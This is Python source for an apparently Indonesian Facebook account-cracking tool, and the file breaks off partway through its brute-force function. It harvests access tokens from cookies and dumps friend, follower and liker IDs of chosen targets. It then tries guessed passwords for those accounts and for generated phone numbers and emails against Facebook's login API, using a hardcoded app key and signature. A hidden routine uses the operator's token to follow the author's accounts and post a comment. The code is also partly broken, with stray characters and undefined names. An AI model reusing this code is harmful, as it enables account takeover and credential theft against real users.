#!/usr/bin/python2
# coding=utf-8
#fb:facebook.com/ih.wibu.14
#fb:facebook.com/ih.wibu.14
# RECOD GUE BANTAI LU ANJING
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # BIRU MUDA
H = '\x1b[1;92m' # UNGU
K = '\x1b[1;93m' # HIJAU
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # KUNING
O = '\x1b[1;96m' # MERAH
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []
animasis = ["[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]", "[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■] LOGIN BERHASIL MOHON TUNGGU NJING"]        
for i in range(len(animasis)):
	time.sleep(0.02)
	sys.stdout.write("\r\x1b[1;95m#\x1b[1;92mLoading "+ random.choice(['\x1b[1;93m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;92m', '\x1b[1;91m','\x1b[1;94m']) + animasis[i % len(animasis)])
	sys.stdout.flush()

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
def __cekfol__():
	ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
	os.system("clear")
	try:
		token = open('/results')
		menu()
	except (KeyError,IOError):
		os.system("-mkdir /results")
		bot_komen()
def logo():
	s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
#	__cekfol__()
#	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('.ua')
	except (KeyError,IOError):
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua.txt")
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua")
	os.system("clear")
	print("""||>>>>> 🅳🅸🅲🅺🆈 🅼🆄🅻🆃🅸 🅱🆁🆄🆃🅴 🅵🅾🆁🅲🅴 <<<<<||
     [▪▪▪|■■■》 [[🅳🅼🅱🅵]] 《■■■|▪▪▪]
╔═════════════════════════════════════════════╗
║╔═══════════════════════════════════════════╗║
║║███████╗═╔███░☆░☆░☆░███╗╔███████═╗╔███████░║║
║║██╔══╗██╗║██░█░░░░░█░██║║██╚══╝██║║██╚═══╝░║║
║║██║░░║██║║██░░█░░░█░░██║║██╔══╗██║║██╔═══╗░║║
║║██║░░║██║║██░░░█░█░░░██║║███████═╝║███████░║║
║║██║░░║██║║██░░░░█░░░░██║║███████═╗║██╔═══╝░║║
║║██║░░║██║║██═╗══○══╔═██║║██╚══╝██║║██║░░░░░║║
║║██╚══╝██╝║██░║░░░░░║░██║║██╔══╗██║║██║░░░░░║║
║║███████╝═╚██═════════██╝╚███████═╝╚██╝░░░░░║║
║╚═══════════════════════════════════════════╝║
╚═════════════════════════════════════════════╝
🅳🅸🅲🅺🆈---------🅼🆄🅻🆃🅸-------🅱🆁🆄🆃🅴----🅵🅾🆁🅲🅴""")
═════════════════════════════
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000298627412/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/4481379231881987/comments?message=Ganteng Dulu KONTOL :V!&access_token={t}')
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+""+k+"]"+p+" PILIHAN"))
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"0"+k+"]"+p+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
    defaultua()
    log_token()
  elif sek=="2":
    defaultua()
    gen()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
    print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
    print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" Status  : "+k+"In Development"+p))
    print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
    print((k+"\n["+p+""+k+"]"+p+" PILIHAN MENU"))
    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
    print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
    print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
    print((k+"["+p+"7"+k+"]"+p+" Result Crack"))
    print((k+"["+p+"8"+k+"]"+p+" User Agent"))
    print((k+"["+p+"0"+k+"]"+p+" Logout"))
    choose_menu()

def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="8":
		menu_user_agent()
	elif r=="0":
		try:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks For Using My Script")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
		menu()	

def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")("+h+"Recommended"+p+")"))
  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
  print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    crackffb(file)
  else:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
	
### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 5 Digit"))
  print((k+"["+p+"•"+k+"]"+p+" Example : 92037"))
  kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  menu()

def random_email():
  data = []
  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
